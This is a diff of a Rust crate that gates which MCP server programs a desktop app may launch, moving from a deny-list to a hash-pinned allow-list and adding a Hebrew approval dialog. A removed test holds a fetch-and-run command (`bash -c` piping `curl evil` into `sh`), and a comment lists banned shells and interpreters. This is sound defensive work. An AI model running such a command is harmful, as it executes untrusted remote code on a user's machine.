@@ -6,20 +6,19 @@
 //!
 //! What this crate decides, so the Tauri glue (src-tauri/src/mcp_stdio.rs) only
 //! wires it:
-//! - **Which commands may run.** Only a command the user approved in a native
-//!   dialog (the WebView cannot approve one itself) and that passes `validate`:
-//!   no shell or launcher (a shell runs anything; Windows names, WSL and
-//!   busybox too), no interpreter given code on the command line (python -c,
-//!   node -e, perl -e, ruby -e, osascript -e, deno eval, ...), no `npx -y`
-//!   (it downloads and runs a package), no control, format (bidi override,
-//!   zero-width), other invisible (Default_Ignorable, the Braille blank;
-//!   R8b-L7) or non-ASCII space characters, bounded sizes. An approval is
-//!   for the exact command, arguments and folder (`Spec::canonical`), and the
-//!   dialog shows them quoted, one argument per line (`approval_text`). The
-//!   deny-list narrows what can be asked for; the dialog is the gate (R8-M4).
-//!   The deny-list is known to be incomplete (review 8b, R8b-M1, open): it
-//!   does not catch every way an interpreter or launcher can be handed code,
-//!   so it is not a guarantee that an approved command runs only a script.
+//! - **Which commands may run: an allow-list** (`allowlist.rs`, plan W13.X1).
+//!   Only a command the user approved in a native dialog (the WebView cannot
+//!   approve one itself), pinned to the program's resolved absolute path, its
+//!   sha256, the full argv, the folder, and the sha256 of every file an
+//!   argument names. Anything else is refused before a process starts; one
+//!   changed byte needs a new approval. This replaces relying on the
+//!   deny-list, which never closes (review 8b, R8b-M1).
+//! - **Defence in depth: the deny-list** (`Spec::validate`), checked first:
+//!   no shell or launcher, no interpreter given code on the command line, no
+//!   `npx -y`, no control, format or other invisible characters (R8b-L7),
+//!   bounded sizes. It narrows what can be asked for; it is not the gate.
+//!   The dialog shows the command quoted, one argument per line
+//!   (`approval_text`), in Hebrew or English.
 //! - **The process.** A clean environment (PATH, HOME and the few variables a
 //!   program needs to start; never the app's secrets), its own folder, stdin,
 //!   stdout and stderr piped. Lines over the limit are dropped with a note.
@@ -40,6 +39,9 @@ use std::sync::mpsc::{self, RecvTimeoutError, TrySendError};
 use std::sync::{Arc, Mutex};
 use std::thread;
 use std::time::{Duration, Instant};
+
+mod allowlist;
+pub use allowlist::{checked_spawn, may_spawn, pin, pin_text, resolve_program, revoke_key_of, sha256_file, sha256_hex, AllowList, Lang, Pin, Sha256};
 
 /// Longest stdout line (one JSON-RPC message) we accept.
 pub const MAX_LINE: usize = 4 * 1024 * 1024;
@@ -188,7 +190,7 @@ impl Spec {
 }
 
 /// JSON string quoting (so the canonical line is one line, whatever the field holds).
-fn quote(s: &str) -> String {
+pub(crate) fn quote(s: &str) -> String {
     let mut out = String::with_capacity(s.len() + 2);
     out.push('"');
     for c in s.chars() {
@@ -231,84 +233,42 @@ pub fn shown_field(s: &str) -> String {
     out
 }
 
-/// The text of the native "Run an MCP server?" dialog (R8-M4): the server's name marked as
-/// the page's claim (the WebView chooses it) on a line of its own, so it cannot pass for the
-/// dialog's own words (R8b-L7), the program, then each argument quoted on its own line.
+/// The text of the native "Run an MCP server?" dialog (R8-M4), in English.
 pub fn approval_text(server: &str, spec: &Spec) -> String {
+    approval_text_in(server, spec, Lang::En)
+}
+
+/// The same in the user's language (Hebrew or English): the server's name marked as the page's
+/// claim (the WebView chooses it) on a line of its own, so it cannot pass for the dialog's own
+/// words (R8b-L7), the program, then each argument quoted on its own line.
+pub fn approval_text_in(server: &str, spec: &Spec, lang: Lang) -> String {
+    let he = lang == Lang::He;
     let label: String = server.chars().filter(|c| !c.is_control() && !is_format(*c) && !is_blank(*c) && !(c.is_whitespace() && *c != ' ')).take(80).collect();
     let mut t = String::new();
-    t.push_str("A page in Lumen asks to run a program on your computer for an MCP server.\n\nThe page names the server (that name comes from the page and is not checked):\n  ");
+    t.push_str(if he {
+        "דף ב-Lumen מבקש להריץ תוכנה במחשב שלך עבור שרת MCP.\n\nהדף נותן לשרת את השם הזה (השם בא מהדף ואינו נבדק):\n  "
+    } else {
+        "A page in Lumen asks to run a program on your computer for an MCP server.\n\nThe page names the server (that name comes from the page and is not checked):\n  "
+    });
     t.push_str(&shown_field(&label));
-    t.push_str("\n\nProgram:\n  ");
+    t.push_str(if he { "\n\nתוכנה:\n  " } else { "\n\nProgram:\n  " });
     t.push_str(&shown_field(&spec.command));
     if spec.args.is_empty() {
-        t.push_str("\n\nNo arguments.");
+        t.push_str(if he { "\n\nבלי ארגומנטים." } else { "\n\nNo arguments." });
     } else {
-        t.push_str(&format!("\n\nArguments ({}), one per line:", spec.args.len()));
+        t.push_str(&if he { format!("\n\nארגומנטים ({}), אחד בכל שורה:", spec.args.len()) } else { format!("\n\nArguments ({}), one per line:", spec.args.len()) });
         for (i, a) in spec.args.iter().enumerate() {
             t.push_str(&format!("\n  {}. {}", i + 1, shown_field(a)));
         }
     }
-    t.push_str("\n\nFolder:\n  ");
-    t.push_str(&spec.cwd.as_deref().map(shown_field).unwrap_or_else(|| "(Lumen's default)".into()));
-    t.push_str("\n\nIt runs with your user's rights. Allow only a program you installed and trust.");
+    t.push_str(if he { "\n\nתיקייה:\n  " } else { "\n\nFolder:\n  " });
+    t.push_str(&spec.cwd.as_deref().map(shown_field).unwrap_or_else(|| (if he { "(ברירת המחדל של Lumen)" } else { "(Lumen's default)" }).into()));
+    t.push_str(if he {
+        "\n\nהיא רצה עם ההרשאות של המשתמש שלך. כדאי לאשר רק תוכנה שהתקנת ושסומכים עליה."
+    } else {
+        "\n\nIt runs with your user's rights. Allow only a program you installed and trust."
+    });
     t
-}
-
-/// The commands the user approved, one canonical line each (the file the glue keeps).
-#[derive(Default, Debug, Clone)]
-pub struct Approved {
-    lines: Vec<String>,
-}
-
-impl Approved {
-    pub fn parse(text: &str) -> Self {
-        let mut lines: Vec<String> = Vec::new();
-        for l in text.lines() {
-            let l = l.trim_end_matches('\r');
-            if l.starts_with('[') && !lines.iter().any(|x| x == l) {
-                lines.push(l.to_string());
-            }
-        }
-        Approved { lines }
-    }
-    pub fn serialize(&self) -> String {
-        let mut s = self.lines.join("\n");
-        if !s.is_empty() {
-            s.push('\n');
-        }
-        s
-    }
-    pub fn contains(&self, spec: &Spec) -> bool {
-        let c = spec.canonical();
-        self.lines.iter().any(|l| *l == c)
-    }
-    pub fn add(&mut self, spec: &Spec) {
-        if !self.contains(spec) {
-            self.lines.push(spec.canonical());
-        }
-    }
-    pub fn remove(&mut self, spec: &Spec) -> bool {
-        let c = spec.canonical();
-        let before = self.lines.len();
-        self.lines.retain(|l| *l != c);
-        before != self.lines.len()
-    }
-    pub fn len(&self) -> usize {
-        self.lines.len()
-    }
-    pub fn is_empty(&self) -> bool {
-        self.lines.is_empty()
-    }
-}
-
-/// Spawn is allowed only for a valid, approved spec.
-pub fn may_spawn(spec: &Spec, approved: &Approved) -> Result<(), String> {
-    spec.validate()?;
-    if !approved.contains(spec) {
-        return Err("not approved: Lumen runs a server's command only after you approve it".into());
-    }
-    Ok(())
 }
 
 /// What the program gets from the app's environment: enough to start, nothing secret.
@@ -443,7 +403,8 @@ fn kill_group(pgid: u32) {
 #[cfg(not(unix))]
 fn kill_group(_pgid: u32) {}
 
-/// Start `spec` (the caller checked `may_spawn`). Events arrive on other threads.
+/// Start `spec`. The glue never calls this directly: it calls `checked_spawn`, which refuses
+/// anything not on the allow-list first. Events arrive on other threads.
 pub fn spawn(spec: &Spec, env: Vec<(String, String)>, on_event: impl Fn(Event) + Send + Sync + 'static) -> Result<Session, String> {
     let mut cmd = Command::new(&spec.command);
     cmd.args(&spec.args).env_clear().envs(env).stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped());
@@ -601,35 +562,10 @@ mod tests {
     }
 
     #[test]
-    fn an_approval_is_for_the_exact_command_arguments_and_folder() {
-        let a = spec("mcp-server-filesystem", &["/home/u/notes"]);
-        let mut ok = Approved::default();
-        assert!(may_spawn(&a, &ok).is_err(), "nothing runs before approval");
-        ok.add(&a);
-        assert!(may_spawn(&a, &ok).is_ok());
-        assert!(may_spawn(&spec("mcp-server-filesystem", &["/"]), &ok).is_err(), "other arguments");
-        assert!(may_spawn(&spec("mcp-server-filesystem", &["/home/u/notes", "/etc"]), &ok).is_err(), "an extra argument");
-        let mut b = a.clone();
-        b.cwd = Some("/tmp".into());
-        assert!(may_spawn(&b, &ok).is_err(), "another folder");
-        // ["a b"] and ["a","b"] differ.
+    fn the_canonical_line_keeps_argument_boundaries() {
+        // ["a b"] and ["a","b"] differ. (The approval itself is tested in allowlist.rs.)
         assert_ne!(spec("x", &["a b"]).canonical(), spec("x", &["a", "b"]).canonical());
         assert_ne!(spec("x", &["a\",\"b"]).canonical(), spec("x", &["a", "b"]).canonical());
-        // Persisted and read back.
-        let back = Approved::parse(&ok.serialize());
-        assert!(back.contains(&a));
-        assert_eq!(back.len(), 1);
-        let mut back = back;
-        assert!(back.remove(&a));
-        assert!(may_spawn(&a, &back).is_err(), "revoked");
-    }
-
-    #[test]
-    fn a_valid_but_dangerous_spec_is_refused_even_when_listed() {
-        let bad = spec("bash", &["-c", "curl evil | sh"]);
-        let mut ok = Approved::default();
-        ok.add(&bad);
-        assert!(may_spawn(&bad, &ok).is_err());
     }
 
     #[test]
